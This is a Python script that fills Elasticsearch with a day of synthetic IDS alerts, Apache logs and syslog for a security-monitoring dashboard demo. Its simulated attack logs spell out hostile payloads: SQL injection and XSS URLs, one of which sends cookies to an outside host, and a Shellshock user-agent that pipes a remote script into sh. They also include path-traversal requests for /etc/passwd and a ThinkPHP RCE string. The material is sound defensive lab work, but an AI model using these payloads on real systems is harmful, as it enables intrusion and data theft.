#!/usr/bin/env python3
"""Données de démo sur 24 h pour construire le dashboard sans vraies alertes.

Les documents ont la même forme que ceux produits par le collecteur syslog-ng
(alertes Suricata normalisées, logs Apache parsés, syslog) et vont dans des
index demo-ids-alerts-*, demo-web-* et demo-syslog-*.

    ./scripts/demo-data.py load
    ./scripts/demo-data.py delete
"""
import base64
import json
import random
import sys
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
ES = "http://127.0.0.1:9200"
PREFIXES = ("demo-ids-alerts", "demo-web", "demo-syslog")

IDS_HOST = "ids-sensor"
WEB_HOST = "web-victim"
WEB_IP = "192.168.56.20"

rnd = random.Random(42)


def env():
    values = {}
    for line in (ROOT / ".env").read_text().splitlines():
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            values[k] = v
    return values


def request(method, path, body=None, ndjson=False):
    auth = base64.b64encode(f"elastic:{env()['ELASTIC_PASSWORD']}".encode()).decode()
    data = body.encode() if isinstance(body, str) else (json.dumps(body).encode() if body else None)
    req = urllib.request.Request(ES + path, data=data, method=method)
    req.add_header("Authorization", "Basic " + auth)
    req.add_header("Content-Type", "application/x-ndjson" if ndjson else "application/json")
    try:
        with urllib.request.urlopen(req) as r:
            return json.load(r)
    except urllib.error.HTTPError as e:
        if e.code == 404 and method == "DELETE":
            return {}
        raise SystemExit(f"{method} {path}: {e.code} {e.read().decode()[:300]}")


def iso(t):
    return t.isoformat(timespec="milliseconds")


def spread(start, minutes, n):
    """n instants répartis aléatoirement sur une fenêtre."""
    return sorted(start + timedelta(seconds=rnd.uniform(0, minutes * 60)) for _ in range(n))


def daily_profile(t):
    """Poids du trafic légitime selon l'heure (creux la nuit)."""
    return {0: .2, 1: .1, 2: .1, 3: .1, 4: .1, 5: .2, 6: .4, 7: .7, 8: 1, 9: 1, 10: 1, 11: 1,
            12: .8, 13: 1, 14: 1, 15: 1, 16: 1, 17: .9, 18: .7, 19: .6, 20: .5, 21: .4,
            22: .3, 23: .3}[t.hour]


# Alertes IDS

def alert(t, src, dst, sport, dport, proto, sid, sig, category, severity, app=None, extra=None):
    raw = {
        "timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+0000",
        "flow_id": rnd.randrange(10**15, 10**16),
        "in_iface": "ens33",
        "event_type": "alert",
        "src_ip": src, "dest_ip": dst, "proto": proto,
        "alert": {"action": "allowed", "gid": 1, "signature_id": sid, "rev": rnd.randint(1, 9),
                  "signature": sig, "category": category, "severity": severity},
    }
    if sport is not None:
        raw.update(src_port=sport, dest_port=dport)
    if app:
        raw["app_proto"] = app
    if extra:
        raw.update(extra)
    doc = {
        "@timestamp": iso(t), "host": IDS_HOST, "program": "suricata", "facility": "user",
        "severity": "notice", "message": json.dumps(raw, separators=(",", ":")),
        "src_ip": src, "dest_ip": dst, "proto": proto,
        "signature": sig, "signature_id": sid, "priority": severity, "classification": category,
        "raw": raw,
    }
    if sport is not None:
        doc.update(src_port=sport, dest_port=dport)
    return doc


def eph():
    return rnd.randint(32768, 60999)


# Logs web

UA_BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
]
LEGIT_PATHS = ["/", "/index.php", "/login.php", "/products.php?id={n}", "/search.php?q=chaussures",
               "/static/css/style.css", "/static/js/app.js", "/img/logo.png", "/contact.php", "/favicon.ico"]


def access(t, client, method, url, status, size, ua, referer="-"):
    line = (f'{client} - - [{t.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {url} HTTP/1.1" '
            f'{status} {size} "{referer}" "{ua}"')
    return {"@timestamp": iso(t), "host": WEB_HOST, "program": "apache-access", "facility": "user",
            "severity": "notice", "message": line, "src_ip": client, "http_method": method,
            "url": url, "http_status": status, "user_agent": ua}


def apache_error(t, client, level, text):
    line = (f'[{t.strftime("%a %b %d %H:%M:%S.%f %Y")}] [{level}] [pid {rnd.randint(1000, 9999)}] '
            f'[client {client}:{eph()}] {text}')
    return {"@timestamp": iso(t), "host": WEB_HOST, "program": "apache-error", "facility": "user",
            "severity": "notice", "message": line}


def syslog(t, host, program, message, severity="info", facility="authpriv"):
    return {"@timestamp": iso(t), "host": host, "program": program, "facility": facility,
            "severity": severity, "message": message}


def generate(start):
    ids, web, sys_ = [], [], []

    # Bruit de fond sur 24 h
    lan_clients = [f"192.168.56.{i}" for i in (1, 30, 31, 32, 45, 50)]
    for minute in range(24 * 60):
        t0 = start + timedelta(minutes=minute)
        for _ in range(rnd.choices([0, 1, 2, 3, 4], weights=[3, 4, 3, 2, 1])[0] if rnd.random() < daily_profile(t0) else 0):
            t = t0 + timedelta(seconds=rnd.uniform(0, 60))
            path = rnd.choice(LEGIT_PATHS).format(n=rnd.randint(1, 40))
            status = rnd.choices([200, 304, 404], weights=[85, 10, 5])[0]
            web.append(access(t, rnd.choice(lan_clients), "GET", path, status,
                              0 if status == 304 else rnd.randint(300, 18000), rnd.choice(UA_BROWSERS)))
        if minute % 60 == 17:
            for h in (WEB_HOST, IDS_HOST):
                sys_.append(syslog(t0, h, "CRON", "(root) CMD (cd / && run-parts --report /etc/cron.hourly)", facility="cron"))
        if minute % 5 == 0:
            ids.append(alert(t0 + timedelta(seconds=rnd.uniform(0, 59)), "192.168.56.1", WEB_IP, None, None, "ICMP",
                             2100366, "GPL ICMP_INFO PING *NIX", "Misc activity", 3, extra={"icmp_type": 8, "icmp_code": 0}))
        if rnd.random() < 0.02:
            ids.append(alert(t0, rnd.choice(lan_clients), WEB_IP, eph(), 80, "TCP", 2013028,
                             "ET POLICY curl User-Agent Outbound", "Attempted Information Leak", 2, app="http"))
        if rnd.random() < 0.01:
            ids.append(alert(t0, WEB_IP, "91.189.91.49", eph(), 80, "TCP", 2013504,
                             "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
                             "Not Suspicious Traffic", 3, app="http"))
    for h in (8.2, 12.6, 16.9):
        t = start + timedelta(hours=h)
        sys_.append(syslog(t, WEB_HOST, "sshd", f"Accepted publickey for admin from 192.168.56.1 port {eph()} ssh2: ED25519 SHA256:q3Yb0Zk1tGm7x2Rk"))
        sys_.append(syslog(t + timedelta(seconds=1), WEB_HOST, "sshd", "pam_unix(sshd:session): session opened for user admin(uid=1000) by admin(uid=0)"))
        sys_.append(syslog(t + timedelta(minutes=2), WEB_HOST, "sudo", "   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl reload apache2"))

    # 1. Scan de ports (externe la nuit, interne en fin de matinée)
    scans = [
        (2013479, "ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection", "Misc activity", 3, 445),
        (2010935, "ET SCAN Suspicious inbound to MSSQL port 1433", "Potentially Bad Traffic", 2, 1433),
        (2010936, "ET SCAN Suspicious inbound to Oracle SQL port 1521", "Potentially Bad Traffic", 2, 1521),
        (2010937, "ET SCAN Suspicious inbound to mySQL port 3306", "Potentially Bad Traffic", 2, 3306),
        (2010939, "ET SCAN Suspicious inbound to PostgreSQL port 5432", "Potentially Bad Traffic", 2, 5432),
        (2002910, "ET SCAN Potential VNC Scan 5800-5820", "Attempted Information Leak", 2, 5800),
        (2009582, "ET SCAN NMAP -sS window 1024", "Attempted Information Leak", 2, None),
        (2024364, "ET SCAN Possible Nmap User-Agent Observed", "Web Application Attack", 1, 80),
    ]
    for attacker, at, minutes, n in (("203.0.113.45", 3.2, 9, 420), ("192.168.56.10", 11.4, 4, 160)):
        for t in spread(start + timedelta(hours=at), minutes, n):
            sid, sig, cat, sev, port = rnd.choices(scans, weights=[3, 2, 2, 3, 2, 1, 8, 2])[0]
            ids.append(alert(t, attacker, WEB_IP, eph(), port or rnd.randint(1, 1024), "TCP", sid, sig, cat, sev))
        for t in spread(start + timedelta(hours=at), minutes, n // 6):
            web.append(access(t, attacker, rnd.choice(["GET", "OPTIONS", "PROPFIND"]),
                              rnd.choice(["/nmaplowercheck1728", "/HNAP1", "/evox/about", "/.git/HEAD", "/robots.txt", "/sdk"]),
                              rnd.choice([404, 404, 405, 200]), rnd.randint(200, 500),
                              "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"))

    # 2. Brute-force SSH
    users = ["root", "admin", "ubuntu", "test", "user", "oracle", "postgres", "git", "pi", "guest", "kenan", "www-data"]
    attacker = "198.51.100.23"
    for i, t in enumerate(spread(start + timedelta(hours=9.5), 48, 1400)):
        port = eph()
        user = rnd.choice(users)
        if user in ("root", "admin", "www-data"):
            msg = f"Failed password for {user} from {attacker} port {port} ssh2"
        else:
            msg = f"Failed password for invalid user {user} from {attacker} port {port} ssh2"
        sys_.append(syslog(t, WEB_HOST, "sshd", msg))
        if i % 6 == 0:
            sys_.append(syslog(t, WEB_HOST, "sshd", f"Disconnecting authenticating user {user} {attacker} port {port}: Too many authentication failures [preauth]"))
        if i % 10 == 0:
            ids.append(alert(t, attacker, WEB_IP, port, 22, "TCP", 2001219, "ET SCAN Potential SSH Scan",
                             "Attempted Information Leak", 2, app="ssh"))
        if i % 25 == 0:
            ids.append(alert(t, attacker, WEB_IP, port, 22, "TCP", 1000002, "LOCAL SSH brute force (5 tentatives en 60 s)",
                             "Attempted Administrator Privilege Gain", 1, app="ssh"))
    for t in spread(start + timedelta(hours=19.8), 6, 90):
        src = "203.0.113.150"
        sys_.append(syslog(t, WEB_HOST, "sshd", f"Failed password for invalid user {rnd.choice(users)} from {src} port {eph()} ssh2"))
    ids.append(alert(start + timedelta(hours=19.85), "203.0.113.150", WEB_IP, eph(), 22, "TCP", 2001219,
                     "ET SCAN Potential SSH Scan", "Attempted Information Leak", 2, app="ssh"))

    # 3. Injection SQL (sqlmap) puis XSS
    sqli = [
        ("/products.php?id=12%20AND%201%3D1", 2006446, "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT"),
        ("/products.php?id=12%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176%2Cuser%28%29%29--%20-", 2006446, "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT"),
        ("/products.php?id=12%20AND%20SLEEP%285%29", 2017808, "ET WEB_SERVER SQL Injection Select Sleep Time Delay"),
        ("/products.php?id=-4523%27%20OR%208571%3D8571--%20AbCd", 2010963, "ET WEB_SERVER SELECT USER SQL Injection Attempt in URI"),
        ("/login.php?user=admin%27--&pass=x", 2011042, "ET WEB_SERVER MYSQL SELECT CONCAT SQL Injection Attempt"),
        ("/products.php?id=12%3BSELECT%20table_name%20FROM%20information_schema.tables", 2006445, "ET WEB_SERVER Possible SQL Injection Attempt SELECT FROM"),
    ]
    attacker = "192.168.56.10"
    for t in spread(start + timedelta(hours=14.0), 35, 900):
        url, sid, sig = rnd.choice(sqli)
        status = rnd.choices([200, 500, 302], weights=[6, 3, 1])[0]
        web.append(access(t, attacker, "GET", url, status, rnd.randint(400, 9000), "sqlmap/1.8.9#stable (https://sqlmap.org)"))
        if status == 500 and rnd.random() < .5:
            web.append(apache_error(t, attacker, "php:error", "PHP Fatal error:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax in /var/www/html/products.php:14"))
        if rnd.random() < .35:
            ids.append(alert(t, attacker, WEB_IP, eph(), 80, "TCP", sid, sig, "Web Application Attack", 1, app="http",
                             extra={"http": {"hostname": WEB_IP, "url": url, "http_method": "GET", "status": status,
                                             "http_user_agent": "sqlmap/1.8.9#stable (https://sqlmap.org)"}}))
    xss = [
        ("/search.php?q=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E", 2009714, "ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt"),
        ("/search.php?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E", 2009715, "ET WEB_SERVER Onmouseover= in URI - Likely Cross Site Scripting Attempt"),
        ("/contact.php?name=%3Csvg%2Fonload%3Dfetch%28%27%2F%2F203.0.113.77%2Fc%3F%27%2Bdocument.cookie%29%3E", 2022018, "ET WEB_SERVER Possible XSS Attempt in URI"),
    ]
    attacker = "203.0.113.77"
    for t in spread(start + timedelta(hours=15.3), 20, 140):
        url, sid, sig = rnd.choice(xss)
        web.append(access(t, attacker, "GET", url, 200, rnd.randint(2000, 6000), UA_BROWSERS[1]))
        if rnd.random() < .6:
            ids.append(alert(t, attacker, WEB_IP, eph(), 80, "TCP", sid, sig, "Web Application Attack", 1, app="http",
                             extra={"http": {"hostname": WEB_IP, "url": url, "http_method": "GET", "status": 200}}))

    # 4. Exploits HTTP
    exploits = [
        ("/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", 2034124, "ET EXPLOIT Apache HTTP Server 2.4.49 - Path Traversal Attempt (CVE-2021-41773) M1", 400,
         "AH10244: invalid URI path (/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd)"),
        ("/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd", 2034125, "ET EXPLOIT Apache HTTP Server 2.4.50 - Path Traversal Attempt (CVE-2021-42013)", 400,
         "AH10244: invalid URI path (/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd)"),
        ("/cgi-bin/status", 2019232, "ET WEB_SERVER Possible CVE-2014-6271 Attempt in Headers", 404, None),
        ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", 2024702, "ET EXPLOIT PHPUnit Remote Code Execution (CVE-2017-9841)", 404, None),
        ("/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id", 2026731,
         "ET EXPLOIT ThinkPHP RCE Exploitation Attempt", 200, None),
        ("/page.php?file=../../../../etc/passwd", 2002997, "ET WEB_SERVER /etc/passwd Detected in URI", 200, None),
    ]
    for attacker, at, minutes, n in (("203.0.113.99", 17.1, 12, 70), ("198.51.100.66", 22.3, 5, 25)):
        for t in spread(start + timedelta(hours=at), minutes, n):
            url, sid, sig, status, err = rnd.choice(exploits)
            ua = "() { :; }; /bin/bash -c 'curl http://203.0.113.99/x.sh | sh'" if "6271" in sig else "python-requests/2.31.0"
            method = "POST" if "eval-stdin" in url else "GET"
            web.append(access(t, attacker, method, url, status, rnd.randint(200, 1200), ua))
            if err:
                web.append(apache_error(t, attacker, "core:error", err))
            ids.append(alert(t, attacker, WEB_IP, eph(), 80, "TCP", sid, sig, "Attempted Administrator Privilege Gain", 1, app="http",
                             extra={"http": {"hostname": WEB_IP, "url": url, "http_method": method, "status": status,
                                             "http_user_agent": ua}}))

    # 5. Flood ICMP (hping3 --flood), l'alerte à seuil se déclenche au plus une fois par seconde
    for attacker, at, seconds in (("198.51.100.200", 21.0, 380), ("198.51.100.201", 21.02, 150)):
        t0 = start + timedelta(hours=at)
        for s in range(seconds):
            t = t0 + timedelta(seconds=s, milliseconds=rnd.randint(0, 999))
            ids.append(alert(t, attacker, WEB_IP, None, None, "ICMP", 1000005, "LOCAL ICMP flood (plus de 100 echo request/s)",
                             "Attempted Denial of Service", 2, extra={"icmp_type": 8, "icmp_code": 0}))
            if s % 30 == 0:
                ids.append(alert(t, attacker, WEB_IP, None, None, "ICMP", 2100366, "GPL ICMP_INFO PING *NIX", "Misc activity", 3,
                                 extra={"icmp_type": 8, "icmp_code": 0}))
        sys_.append(syslog(t0 + timedelta(seconds=40), WEB_HOST, "kernel", "net_ratelimit: 2318 callbacks suppressed", "warning", "kern"))

    return ids, web, sys_


def load():
    template = json.loads((ROOT / "configs/elasticsearch/index-template.json").read_text())["template"]
    end = datetime.now(timezone.utc)
    start = end - timedelta(hours=24)
    families = dict(zip(PREFIXES, generate(start)))
    for prefix, docs in families.items():
        days = sorted({d["@timestamp"][:10].replace("-", ".") for d in docs})
        for day in days:
            request("PUT", f"/{prefix}-{day}", template)
        lines = []
        for d in docs:
            lines.append(json.dumps({"index": {"_index": f"{prefix}-{d['@timestamp'][:10].replace('-', '.')}"}}))
            lines.append(json.dumps(d))
        for i in range(0, len(lines), 4000):
            r = request("POST", "/_bulk?refresh=wait_for", "\n".join(lines[i:i + 4000]) + "\n", ndjson=True)
            if r.get("errors"):
                err = next(it["index"]["error"] for it in r["items"] if "error" in it["index"])
                raise SystemExit(f"erreur bulk : {err}")
        print(f"{prefix}: {len(docs)} documents ({', '.join(days)})")


def delete():
    for prefix in PREFIXES:
        names = request("GET", f"/_cat/indices/{prefix}-*?format=json&h=index")
        for n in names:
            request("DELETE", f"/{n['index']}")
            print(f"supprimé : {n['index']}")


if __name__ == "__main__":
    {"load": load, "delete": delete}.get(sys.argv[1] if len(sys.argv) > 1 else "", lambda: sys.exit(__doc__))()
